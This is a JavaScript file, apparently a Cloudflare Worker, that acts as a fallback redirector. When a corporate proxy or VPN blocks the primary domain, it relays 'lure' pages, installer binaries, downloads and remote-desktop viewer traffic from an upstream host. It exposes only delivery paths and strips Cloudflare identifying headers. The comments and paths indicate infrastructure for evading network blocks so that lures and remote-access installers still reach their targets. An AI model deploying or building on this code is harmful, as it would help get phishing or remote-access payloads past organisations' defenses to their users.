// fleet edge fallback - proxies panel, lure and installer traffic through a
// *.workers.dev (or custom) host when the primary domain is blocked by a
// corporate proxy or VPN. WebSocket upgrades (RD viewer) pass straight through.
//
// The upstream origin is provided by the ORIGIN text binding (wrangler.toml or
// the deploy script) and must be a PUBLIC lure host (e.g. get.example.com):
// panel.<zone> sits behind Cloudflare Access, which would redirect the Worker.
//
// Only delivery paths are exposed (lure pages, installer, binaries, downloads).
// The admin UI/API is intentionally not reachable through the fallback domain.

const PUBLIC_PREFIXES = [
  "/__lure.js",
  "/__lure/target",
  "/install/",
  "/e/",
  "/dl/",
  "/_next/",
  "/sites/",
];

const PUBLIC_EXACT = new Set([
  "/",
  "/favicon.ico",
  "/robots.txt",
  "/healthz",
  "/healthz.json",
]);

function isPublic(pathname) {
  if (PUBLIC_EXACT.has(pathname)) return true;
  return PUBLIC_PREFIXES.some((p) => pathname.startsWith(p));
}

export default {
  async fetch(request, env) {
    const origin = new URL(env.ORIGIN || "https://get.example.com");
    const url = new URL(request.url);

    if (!isPublic(url.pathname)) {
      return new Response("not found\n", {
        status: 404,
        headers: { "Content-Type": "text/plain", "Cache-Control": "no-store" },
      });
    }

    const target = new URL(url.pathname + url.search, origin);

    if (request.headers.get("Upgrade") === "websocket") {
      return fetch(new Request(target.toString(), request));
    }

    const headers = new Headers(request.headers);
    headers.set("Host", origin.host);
    headers.set("X-Forwarded-Host", url.host);
    headers.set("X-Forwarded-Proto", "https");
    for (const h of [
      "cf-connecting-ip",
      "cf-ipcountry",
      "cf-ray",
      "cf-visitor",
      "cf-worker",
    ]) {
      headers.delete(h);
    }

    const init = { method: request.method, headers, redirect: "manual" };
    if (request.method !== "GET" && request.method !== "HEAD") {
      init.body = request.body;
    }

    const upstream = await fetch(target.toString(), init);
    const out = new Headers(upstream.headers);
    out.set("Cache-Control", "no-store");
    return new Response(upstream.body, {
      status: upstream.status,
      statusText: upstream.statusText,
      headers: out,
    });
  },
};
